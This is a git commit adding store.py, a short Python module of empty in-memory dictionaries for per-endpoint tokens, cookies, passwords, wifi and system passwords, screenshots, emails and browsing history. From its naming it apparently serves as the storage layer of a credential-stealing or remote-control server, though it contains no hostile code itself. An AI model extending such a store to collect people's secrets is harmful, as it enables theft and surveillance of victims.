a1053433e4e2cdc9818c9f81804a1473fabe3798
kaueX3 <122127545+kaueX3@users.noreply.github.com>
2026-03-29 02:06:24 -0300

    Create store.py

---
+++ store.py
@@ -0,0 +1,16 @@
+# Memória do Sistema (RAM-based para evitar dependências de BD)
+endpoints = {}
+metrics_data = []
+endpoint_tokens = {}
+endpoint_cookies = {}
+endpoint_passwords = {}
+endpoint_files = {}
+endpoint_screenshots = {}
+endpoint_emails = {}
+endpoint_history = {}
+endpoint_system_passwords = {}
+endpoint_wifi_passwords = {}
+endpoint_system_info = {}
+full_reports = {}
+uploaded_files = {}
+screenshot_requests = {}
